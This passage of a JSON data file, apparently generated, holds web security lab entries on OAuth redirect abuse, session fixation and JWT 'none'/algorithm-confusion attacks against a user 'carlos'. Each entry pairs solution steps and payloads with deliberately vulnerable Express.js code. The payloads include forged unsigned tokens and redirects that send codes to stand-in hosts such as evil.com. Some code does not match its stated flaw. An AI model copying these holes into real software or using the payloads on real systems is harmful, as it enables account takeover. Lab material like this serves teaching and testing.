    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode1234'; if (redirect_uri.startsWith('https://trusted.com')) { const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); } else { res.status(400).send('Invalid redirect URI'); } }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'authcode1234') res.json({ access_token: 'valid_token_for_carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer valid_token_for_carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Token Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://attacker.com?code=",
      "https://trusted.com.attacker.com",
      "https://trusted.com%00.attacker.com"
    ]
  },
  {
    "Lab scenario": "Session Fixation via predictable session tokens in login flow",
    "Lab Description": "This lab demonstrates a session fixation vulnerability within the login mechanism. The application assigns session IDs prior to authentication but fails to regenerate them post-login, allowing an attacker to fixate a session. The application uses insecure random generation for the session token which is passed as a cookie. To solve: fixate Carlos's session and access his account by predefining the session ID before he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite's Proxy and Intercept to inspect the login request and response to identify the session cookie assigned pre-authentication.",
      "Confirm that the same session cookie persists after a successful login, indicating the vulnerability.",
      "Craft a malicious link embedding the session ID in the cookie and deliver it to the victim (Carlos) via social engineering.",
      "Once Carlos logs in using the fixated session, reuse the same session ID in your browser to gain access to his authenticated session.",
      "Verify access by navigating to /my-account and confirming Carlos's account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const crypto = require('crypto'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'hunter2' }; app.use((req, res, next) => { if (!req.cookies.session) { const sessionId = crypto.randomBytes(4).toString('hex'); res.cookie('session', sessionId); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send('Login successful. Welcome ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { res.send('Account page for logged in user.'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Set-Cookie: session=deadbeef;",
      "Inject fixated session ID via intercepted HTTP request before victim login.",
      "Share crafted malicious URL with embedded session parameter.",
      "Replay the fixed session post-victim login."
    ]
  },
  {
    "Lab scenario": "JWT token signature spoofing via 'none' algorithm",
    "Lab Description": "This lab uses JWT tokens for authentication but fails to properly enforce signature verification, accepting tokens with the algorithm field set to 'none'. The application trusts the header-supplied algorithm, allowing attackers to bypass authentication by supplying an unsigned token. To solve: forge a token for Carlos without needing the secret and log into his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT token from your own account during login.",
      "Decode the JWT token using jwt.io or Burp Decoder to inspect its structure.",
      "Modify the 'alg' field in the header to 'none' and change the payload's username to 'carlos'.",
      "Remove the signature part entirely and re-encode the JWT token.",
      "Replay the modified token in the Authorization header and access /my-account to confirm successful login as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, SECRET)) { res.send('Welcome ' + decoded.payload.username); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [forged_token]"
    ]
  },
  {
    "Lab scenario": "OAuth2 token leakage via referrer header in third-party redirect",
    "Lab Description": "This lab demonstrates insecure OAuth2 token handling. After successful authorization, the application redirects users to a third-party site, leaking the token in the Referer header. Attackers can capture the token from this third-party service and reuse it. To solve: capture Carlos's leaked OAuth token and use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite's Proxy to capture the OAuth2 authorization flow and observe the 'Location' header on redirect.",
      "Identify the OAuth2 access token being appended as a query parameter during redirection to a third-party domain.",
      "Set up your own HTTP server to mimic the third-party service and intercept incoming requests with tokens.",
      "Send Carlos a crafted phishing link that triggers OAuth flow; once he logs in, the token will be sent to your server via the Referer header.",
      "Replay the intercepted token using Postman to authenticate as Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const tokens = { carlos: 'abc123token' }; app.get('/auth', (req, res) => { const { user } = req.query; const token = tokens[user]; res.redirect('http://third-party.com/welcome?access_token=' + token); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer abc123token') { res.send('Carlos Account Details'); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running on http://localhost:4000'));",
    "payloads": [
      "Intercept Referer header during third-party redirect: access_token=abc123token",
      "Crafted phishing OAuth consent link: http://victim-app.com/auth?user=carlos",
      "Authorization: Bearer abc123token",
      "Replay token in Postman or Burp to access /my-account"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via algorithm confusion",
    "Lab Description": "This lab demonstrates an insecure JSON Web Token (JWT) validation implementation that incorrectly trusts the 'alg' header of incoming tokens. The application uses symmetric HMAC verification but allows switching the algorithm to 'none'. To solve: Craft a forged token to escalate to the 'admin' user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT from a logged-in user request and decode it using jwt.io or Burp Decoder.",
      "Confirm the JWT structure and spot the 'alg' value set to 'HS256'. Change it to 'none' and remove the signature part.",
      "Manually edit the payload to replace your username with 'admin'.",
      "Send the modified token using Burp Repeater to authenticate as 'admin'.",
      "Visit the /admin route to verify successful privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Spoof Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth authorization code reuse",
    "Lab Description": "This lab's OAuth 2.0 flow is improperly designed, allowing an attacker to reuse a captured authorization code to hijack a user session. The application does not properly invalidate codes after first use. To solve: Steal and reuse a victim's authorization code to log in as that user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy your login and capture the OAuth redirection flow.",
      "Analyze the authorization code grant flow, note the 'code' parameter in the URL.",
      "Intercept the victim's OAuth callback request and capture their 'code' value.",
      "Manually replay the callback request using the victim's code via Burp Repeater.",
      "Access the victim's account dashboard to confirm successful session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.urlencoded({ extended: true })); let sessions = {}; app.get('/oauth/callback', async (req, res) => { const code = req.query.code; if (!code) return res.status(400).send('No code provided'); try { const tokenResponse = await axios.post('https://auth-server/token', { code }); sessions[req.ip] = tokenResponse.data.user; res.redirect('/my-account'); } catch (err) { res.status(500).send('OAuth exchange failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.ip]; if (!user) return res.status(401).send('Not logged in'); res.send(`Welcome ${user}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Code Reuse Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/oauth/callback?code=stolen_code_value",
      "/oauth/callback?code=previously_valid_code",
      "/oauth/callback?code=reused_auth_code"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "This lab simulates a session fixation vulnerability where the session identifier is predictable and not regenerated after login. The application uses user-controlled session IDs from URL parameters, allowing attackers to set a session ID before authentication. To solve: Fixate a session ID before login and hijack the authenticated session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request to /login?sessionId=attacker123 before authentication.",
      "Send the same sessionId parameter to the victim in a phishing link and wait for them to log in.",
      "Once the victim logs in using the fixed session ID, send a GET /my-account request using the same sessionId cookie.",
      "Observe the response to confirm account takeover.",
      "Access /my-account to solve the lab and complete the session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': { password: 'password123', session: null } }; app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; if (users[username] && users[username].password === password) { users[username].session = sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', users[username].session); res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.sessionId; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send(`Account details for ${user}`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?username=carlos&password=password123&sessionId=attacker123",
      "/login?sessionId=attacker123",
      "Cookie: sessionId=attacker123"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login workflow",
    "Lab Description": "This lab's session management mechanism is flawed and allows session fixation attacks. The application issues session cookies prior to authentication and fails to assign new tokens upon successful login. To solve: Hijack Carlos's session by fixing the session identifier before he logs in, then access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and note the session cookie issued by the server.",
      "Send a crafted phishing email to Carlos or use social engineering to make him reuse the provided session ID for login.",
      "After Carlos authenticates using the fixed session ID, reuse the same session cookie in your own browser or API client.",
      "Confirm that you are now logged in as Carlos without providing any credentials.",
      "Visit /my-account while using the fixed session cookie to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecret123' }; app.get('/login', (req, res) => { let sessionID = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionID); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send('Welcome ' + user); } else { res.send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Set-Cookie: sessionid=attackersession123;",
      "Use phishing email to send: https://victim.site/login with sessionid=attackersession123",
      "Reuse sessionid=attackersession123 after victim logs in"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token validation",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for session authentication but fails to enforce the correct cryptographic algorithm. An attacker can manipulate the token header to use 'none' as the algorithm and forge a valid session token. To solve: Forge a valid admin JWT and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT during a login session using Burp Suite or OWASP ZAP.",
      "Modify the JWT header to { \"alg\": \"none\", \"typ\": \"JWT\" } and remove the signature portion.",
      "Craft a payload like { \"username\": \"admin\" } and base64-encode the header and payload.",
      "Send the forged JWT as a Bearer token in the Authorization header to /admin.",
      "Verify successful access to the admin panel to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'insecure-secret'; app.get('/login', (req, res) => { const username = req.query.username; const token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Access denied'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer <header.payload.>",
      "Replace JWT in Cookie or Auth header with none-alg variant"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login flow",
    "Lab Description": "This lab's OAuth integration incorrectly trusts the 'state' parameter without proper validation. An attacker can intercept and modify this value to hijack authorization codes during the OAuth redirection. To solve: Manipulate the OAuth 'state' parameter to capture a valid authorization code and log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the OAuth login request with Burp Suite and observe the 'state' parameter in the redirect URL.",
      "Modify the 'state' parameter to a predictable or controlled value and replay the request.",
      "Use Burp Collaborator or a controlled server to catch the authorization code sent via redirect.",
      "Exchange the intercepted authorization code for an access token using Postman or curl.",
      "Submit the token to /my-account endpoint to confirm the hijack and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, state } = req.query; if (!state || !code) return res.status(400).send('Invalid request'); res.cookie('session_token', code); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session_token; if (token === 'carlos_auth_code') { res.send('Welcome Carlos!'); } else { res.send('Unauthorized'); } }); app.listen(5000);",
    "payloads": [
      "https://target.site/auth/callback?code=carlos_auth_code&state=attacker",
      "Manipulate state to match known value: attacker123",
      "OAuth authorization code interception using Burp Collaborator"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
    "Lab Description": "This lab's authentication system uses JWTs for session management. The server uses the 'alg' field from the incoming token without proper validation, making it vulnerable to algorithm confusion. The application fails to enforce the intended HS256 signature verification when decoding JWTs, allowing attackers to switch the algorithm to 'none' and bypass signature verification entirely. To solve: Forge a valid session token for the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid login request using Burp Suite and capture the JWT from the Authorization header.",
      "Use jwt.io or a custom script to decode the JWT and note the 'alg' value is 'HS256'.",
      "Modify the header's 'alg' field to 'none' and remove the signature section entirely.",
      "Set the payload 'sub' to 'carlos' and re-encode the JWT without a signature.",
      "Replay the modified token using Postman in an Authorization header and access /my-account to confirm successful authentication."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && (!payload.header.alg || payload.header.alg === 'none' || jwt.verify(token, SECRET_KEY))) { res.send(`Welcome, ${payload.payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Lab running at http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "{\"alg\":\"none\"}.{ \"sub\":\"carlos\" }.",
      "{\"alg\":\"none\",\"typ\":\"JWT\"}.{ \"sub\":\"carlos\" }."
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in authorization flow",
    "Lab Description": "The application implements OAuth 2.0 for single sign-on (SSO) but lacks proper validation of the redirect_uri parameter. An attacker can manipulate this parameter to hijack an OAuth authorization code meant for another user. The application incorrectly trusts any user-supplied redirect_uri pointing to the same domain. To solve: Trick the application into sending an OAuth code for the user 'carlos' to your controlled endpoint, then exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate the OAuth login process and intercept the request containing the redirect_uri parameter.",
      "Modify the redirect_uri parameter to point to your controlled endpoint: https://attacker.com/callback.",
      "Send the phishing link to the victim (simulated in lab) and wait for the authorization code to be sent to your server.",
      "Use Postman to send a POST request to the OAuth provider's token endpoint with the stolen code and retrieve Carlos's access token.",
      "Replay the token against the /my-account API to access Carlos's protected resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri, code } = req.query; if (redirect_uri && code) { res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid-oauth-token-for-carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running at http://localhost:4000'));",
    "payloads": [
      "https://attacker.com/callback",
      "https://attacker.com/oauth/code-stealer",
      "https://attacker.com/evil?code=intercepted-code"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab's session management logic fails to regenerate session tokens upon successful login. Attackers can fixate their own session ID and later reuse it to hijack authenticated user sessions. The application issues the session cookie before verifying user credentials, allowing the attacker to trick a victim into using the attacker's predefined session token. To solve: Fixate your session ID, trick the application into authenticating as Carlos, then reuse the session ID to access Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to initiate a GET request to /login and capture the Set-Cookie header issuing a session ID.",
      "Send this session ID to the victim (simulated scenario) and wait for them to log in.",
      "Reattach the fixed session ID to your requests in Burp or Postman.",
      "Access the /my-account endpoint using the fixed session ID to verify that you're now logged in as 'carlos'.",
      "Confirm successful exploitation when Carlos's account details appear."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'hunter2', 'admin': 'adminpass' }; app.get('/login', (req, res) => { if (!req.cookies.session) { res.cookie('session', Math.random().toString(36).substr(2)); } res.send('Please log in.'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-for-carlos') { res.send('Account details for carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
    "payloads": [
      "Cookie: session=fixed-session-for-carlos",
      "Set-Cookie: session=fixed-session-for-carlos",
      "fixed-session-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in authentication flow",
    "Lab Description": "This lab's authentication mechanism is vulnerable to JWT algorithm confusion. The application accepts JSON Web Tokens for authentication but fails to enforce the expected signing algorithm, allowing an attacker to switch from asymmetric RS256 to symmetric HS256. The application does not validate the secret when HS256 is used. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture an authenticated JWT token using Burp Suite's Proxy tab after logging in as your own user.",
      "Inspect the token header and notice the 'alg' parameter is set to RS256. Modify it to HS256 and set the signature part to an HMAC using the public key as the secret.",
      "Use a JWT crafting tool like jwt.io or Burp Suite's Decoder to craft a forged token for username 'carlos'.",
      "Replace your original JWT with the forged one in an authenticated request to /my-account.",
      "If successful, the page will display Carlos's account data, confirming the token bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account details for ${decoded.username}`); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"} | Payload: {\"username\":\"carlos\"} | Signature: HMAC(publicKey, header.payload)",
      "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ.[HMAC signature]"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure cookie handling",
    "Lab Description": "This lab is vulnerable to session fixation due to improper handling of session cookies. The application accepts user-supplied session tokens and fails to regenerate them upon authentication. An attacker can set a known session ID before login, which will persist across privilege escalation. To solve: fix a session ID and log in as the victim user 'carlos' using the same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP, intercept the GET /login request and set a predictable session ID via Cookie header (e.g., PHPSESSID=attackerfixedid).",
      "Use the victim's credentials during login and observe that the session token remains unchanged after successful authentication.",
      "Reuse the fixed session ID to access /my-account directly using the same token.",
      "Confirm access to Carlos's profile with the fixed session ID.",
      "Use ZAP to confirm the same session persists across multiple requests, validating fixation success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.get('/login', (req, res) => { res.cookie('session', req.cookies.session || Math.random().toString(36).substring(2)); res.send('Please log in'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { res.send(`Account data for session ${req.cookies.session}`); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attackerfixedid",
      "Login POST: username=carlos&password=qwerty123 with Cookie: session=attackerfixedid",
      "GET /my-account with Cookie: session=attackerfixedid"
    ]
  },
  {
    "Lab scenario": "OAuth token misconfiguration in third-party login",
    "Lab Description": "This lab's OAuth login flow improperly trusts the 'sub' claim from a third-party provider without validating issuer or audience fields, allowing impersonation of other users. To solve: forge a valid ID Token with 'sub' set to Carlos and log in via OAuth to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a legitimate OAuth authentication flow from the provider for your own account.",
      "Decode the JWT token using jwt.io and analyze the 'sub' field which defines the user identity.",
      "Manually craft a JWT with the 'sub' claim set to 'carlos' while reusing the same header and signing key (if known or guessable).",
      "Submit the forged ID Token to the application’s OAuth callback endpoint to complete login as Carlos.",
      "Confirm by accessing the /my-account endpoint to verify account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const idToken = req.body.id_token; const decoded = jwt.decode(idToken); if (!decoded || !decoded.sub) return res.status(401).send('Invalid ID token'); res.send(`Logged in as ${decoded.sub}`); }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\"} | Payload: {\"sub\":\"carlos\"} | Signature: HMAC(secret, header.payload)",
      "eyJhbGciOiAiSFMyNTYifQ.eyJzdWIiOiAiY2FybG9zIn0.[Valid HMAC signature]"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Pre-Login Cookie Reuse",
    "Lab Description": "The login flow of this web app allows a pre-authenticated session ID to persist after a successful login, leading to session fixation. The application does not regenerate session identifiers after login, allowing attackers to set a session beforehand. To solve: Hijack Carlos's session using a pre-set session ID cookie.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Start Burp Suite and intercept the initial GET /login request to the site.",
      "Note the Set-Cookie header for session ID and manually fix it to a predictable value like 'sessionid=attacker123'.",
      "Send the crafted login link to Carlos (simulated by switching users) with the preset session ID cookie.",
      "Log in as Carlos using known credentials from a separate session but using the 'attacker123' session ID.",
      "Reuse the same session ID cookie in a browser and access /my-account to verify hijack success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Welcome, ' + req.session.user); else res.status(403).send('Not authorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "GET /login HTTP/1.1 with pre-injected sessionid",
      "POST /login with valid credentials while sessionid=attacker123 is set"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
    "Lab Description": "The app uses JWTs for session management but does not enforce a strong algorithm check. It accepts unsigned tokens if the 'alg' header is modified to 'none'. The application verifies JWTs based on the 'alg' field without checking signature integrity. To solve: Forge an admin token using alg:none and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in as a regular user and capture the Authorization: Bearer token using Burp Suite.",
      "Use jwt.io or Postman to decode the JWT and examine the 'alg' header.",
      "Craft a new token with the payload { \"username\": \"carlos\", \"role\": \"admin\" } and header { \"alg\": \"none\" }, without a signature.",
      "Inject the crafted JWT into the Authorization header.",
      "Send a GET /admin-dashboard request using the unsigned JWT to confirm admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const secretKey = 'supersecret'; app.get('/admin-dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, secretKey, { algorithms: [payload.header.alg] }); if (verified && verified.role === 'admin') { res.send('Welcome to admin dashboard'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "Header: { \"alg\": \"none\" }",
      "Payload: { \"username\": \"carlos\", \"role\": \"admin\" }",
      "JWT: [base64url(header)].[base64url(payload)]. (no signature)",
      "Authorization: Bearer [forged-token]"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Leakage in Redirect URL",
    "Lab Description": "The web application uses the OAuth 2.0 implicit flow and allows open redirection in the redirect_uri parameter. This enables token leakage through an attacker-controlled URL. The application trusts user-controlled redirect URIs without validating the domain. To solve: Leak Carlos's token to an attacker domain and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect the OAuth login process and locate the 'redirect_uri' parameter in the authorization request.",
      "Craft a malicious URL with redirect_uri pointing to an attacker-controlled site (e.g., https://evil.com/capture).",
      "Send the malicious OAuth link to Carlos (simulate by visiting the link yourself with Carlos logged in).",
      "Capture the access_token fragment in the redirect to https://evil.com/capture#access_token=... using a local HTTP server or webhook.site.",
      "Replay the stolen token in the Authorization: Bearer header to access /user-profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/user-profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-oauth-token') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "https://vulnerable.com/auth?redirect_uri=https://evil.com/capture",
      "Authorization: Bearer carlos-oauth-token",
      "Access_token extracted from redirect URI fragment",
      "OAuth implicit flow token replay"
    ]
  },
  {
    "Lab scenario": "Session fixation in URL parameter during login",
    "Lab Description": "The application implements a flawed session handling mechanism that accepts user-provided session IDs via URL query parameters. When users log in, the session ID from the URL is reused, allowing attackers to predefine a session and force victims to use it. To solve: Hijack Carlos's session by crafting a valid login link that fixes the session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the login process and observe that the session ID can be passed via GET /login?session=abc123",
      "Send the request to Burp Repeater and confirm that the application sets the provided session ID in the Set-Cookie header after login",
      "Craft a login URL with a fixed session ID and send it to the victim (Carlos)",
      "Wait for Carlos to log in using the malicious session ID",
      "Access /my-account using the same session ID and verify that you’re logged in as Carlos"
    ],
    "Vulnerability name": "Authentication",
